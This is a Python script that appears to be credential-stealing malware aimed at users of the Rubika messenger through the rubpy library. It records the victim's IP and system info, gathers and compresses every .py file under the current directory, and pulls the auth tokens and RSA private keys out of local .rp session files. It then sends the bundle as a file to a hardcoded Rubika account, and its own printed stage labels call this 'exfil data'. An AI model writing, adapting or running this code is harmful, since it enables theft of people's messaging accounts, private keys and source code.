import os
import gzip
import base64
from rubpy import Client
from rubpy.exceptions import NotRegistered
from rubpy.crypto import Crypto
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
is_linux = os.uname().sysname == "Linux"
ip = os.popen('curl icanhazip.com').read()
if not is_linux:
    print("Unsupported os, exiting...")
python_files = []
rubpy_files = []
for top in os.curdir:
    for root, dirs, files in os.walk(top):
        for file in files:
            full_path = os.path.join(root,file)
            if file.endswith('.py'):
                print("found:",full_path)
                python_files.append(full_path)
            if file.endswith('.rp'):
                print("found: ",full_path)
                rubpy_files.append(full_path)
dryrun=False
print("stage 1 complete: discovery")
def archive(name, data):
    if isinstance(data, str):
        data = data.encode()
    if isinstance(name, str):
        name = name.encode()
    name_size = len(name).to_bytes(8,'big')
    data_size = len(data).to_bytes(8,'big')
    return name_size+name+data_size+data
datas = []
datas.append(archive("ip.special",ip))
datas.append(archive("uname.special",str(os.uname())))
if not dryrun:
  for i in python_files:
    with open(i,"rb") as file:
        code = file.read()
    compressed=gzip.compress(code)
    datas.append(archive(i,compressed))
print("stage 2 complete: python files")
working_client=None
for i in rubpy_files:
    i = i.replace('.rp','')
    client = Client(i)
    client.max_retries = 1
    try:
            client.connect()
            client.decode_auth = Crypto.decode_auth(client.auth) if client.auth is not None else None
            client.import_key = pkcs1_15.new(RSA.import_key(client.private_key.encode())) if client.private_key is not None else None
            client.get_me()
            working_client=i
            client.disconnect()
    except NotRegistered:
        client.disconnect()
        continue
    if not dryrun:
      auth = client.auth
      private_key = client.private_key
      d = f"auth={repr(auth)};"+f"private={repr(private_key)}"
      compressed = gzip.compress(d)
      datas.append(compressed)
if not dryrun:
  final_data = "SCF".encode()+b"\0"+b"".join(datas)
if not working_client:
    print("Failed to find a working session file")
    exit()
client = Client(working_client)
with client:
    if not dryrun:
      client.send_document("u0G3YVs0f82d392e17389eaccaa926f6",document=final_data,file_name="data.bin")
    guid = client.get_me().user.user_guid
print("stage 3 complete: exfil data")
print(guid)